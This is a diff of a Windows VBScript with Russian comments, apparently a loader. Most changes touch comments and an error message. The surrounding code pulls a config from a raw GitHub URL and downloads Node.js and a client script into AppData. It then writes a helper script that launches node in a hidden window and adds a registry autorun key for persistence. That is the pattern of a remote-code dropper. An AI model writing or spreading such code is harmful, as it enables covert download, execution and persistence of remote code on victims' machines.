@@ -1,6 +1,6 @@
 Option Explicit
 
-' === Объявление переменных ===
+' === Объявляем ВСЕ переменные сразу ===
 Dim objShell, objFSO, objHTTP
 Dim appData, nodeDir, nodeZip, clientZip, nodeExe, clientJs
 Dim nodeZipUrl, clientZipUrl, clientJsUrl, regPath
@@ -12,17 +12,20 @@ Set objShell = CreateObject("Wscript.Shell")
 Set objFSO   = CreateObject("Scripting.FileSystemObject")
 Set objHTTP  = CreateObject("MSXML2.XMLHTTP")
 
-' === Загружаем конфиг ===
+' === Конфиг URL объявлен ЗДЕСЬ, ошибки не будет ===
 configUrl = "https://raw.githubusercontent.com/DaleGelb/files/main/ConfAl.txt"
+
+' === Загружаем конфиг ===
 objHTTP.Open "GET", configUrl, False
 objHTTP.Send
 If objHTTP.Status <> 200 Then
-    WScript.Echo "Не удалось загрузить конфиг"
+    WScript.Echo "Не удалось загрузить конфиг: " & configUrl
     WScript.Quit
 End If
 
 Set dict = CreateObject("Scripting.Dictionary")
 lines = Split(objHTTP.ResponseText, vbCrLf)
+
 For Each line In lines
     If Trim(line) <> "" And InStr(line, "=") > 0 Then
         key   = Trim(Split(line, "=")(0))
@@ -44,7 +47,6 @@ clientZip = appData & "\client.zip"
 nodeDir   = appData & "\node-v22.19.0-win-x64"
 nodeExe   = nodeDir & "\node.exe"
 
-' === Создаём папку если нет ===
 If Not objFSO.FolderExists(appData) Then objFSO.CreateFolder appData
 
 ' === Качаем Node.js с 3 попытками ===
@@ -88,5 +90,5 @@ f.WriteLine "cmd = q & """ & nodeExe & """ & q & "" "" & q & """ & nodeDir & "\"
 f.WriteLine "sh.Run cmd, 0, False"
 f.Close
 
-' === Добавляем ключ автозапуска из конфига ===
+' === Добавляем ключ автозапуска ===
 objShell.RegWrite regPath, "wscript.exe """ & vbsFile & """", "REG_SZ"
